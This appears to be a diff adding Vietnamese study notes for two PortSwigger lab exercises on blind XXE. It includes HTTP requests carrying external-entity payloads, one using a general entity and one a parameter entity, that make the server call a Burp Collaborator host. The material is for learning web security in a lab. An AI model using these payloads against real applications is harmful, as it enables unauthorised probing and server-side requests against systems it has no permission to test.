@@ -205,6 +205,51 @@ http://a.com
 - Nội dung hiển thị trong ảnh là nội dung của `/etc/hostname`
 - Submit solution
 
+### Lab: Blind XXE with out-of-band interaction
+- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
+- Gửi request **check stock** đến **Repeater**
+- Thay đổi payload thành:
+
+```http
+POST /product/stock HTTP/2
+Host: 0a20005b0305155e8ba47e19007c00dd.web-security-academy.net
+...
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+	<!ENTITY xxe SYSTEM "https://yorr-burp-collaborator.oastify.com">
+]>
+<stockCheck>
+    <productId>1; &xxe;</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+- Copy địa chỉ **Burp Collaborator** và dán vào entity `xxe`
+- Khi gọi `entity xxe`, ứng dụng sẽ gửi request đến **Burp Collaborator**
+- Pool now để nhận request
+
+### Lab: Blind XXE with out-of-band interaction via XML parameter entities
+- Tương tự như lab ở trên, ta sử dụng **General entity (&)** để khai thác nhưng nhận được `"Entities are not allowed for security reasons"`
+- Thử khai thác bằng **Parameter entity (%)**
+- Gửi lại request với payload sau:
+
+```http
+POST /product/stock HTTP/2
+Host: 0a4f00c0043e914981d0251e001f0036.web-security-academy.net
+...
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "https://yorr-burp-collaborator.oastify.com">%xxe;
+]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+- Sự khác nhau rõ rệt là **General entity (&)** sử dụng ở body, còn **Parameter entity (%)** sử dụng ở **Document Type Definition (DTD)**
+- Copy địa chỉ **Burp Collaborator** và dán vào entity `xxe`
+- Khi gọi `entity xxe`, ứng dụng sẽ gửi request đến **Burp Collaborator**
+- Pool now để nhận request
+
 ## Prevent
 --- 
 
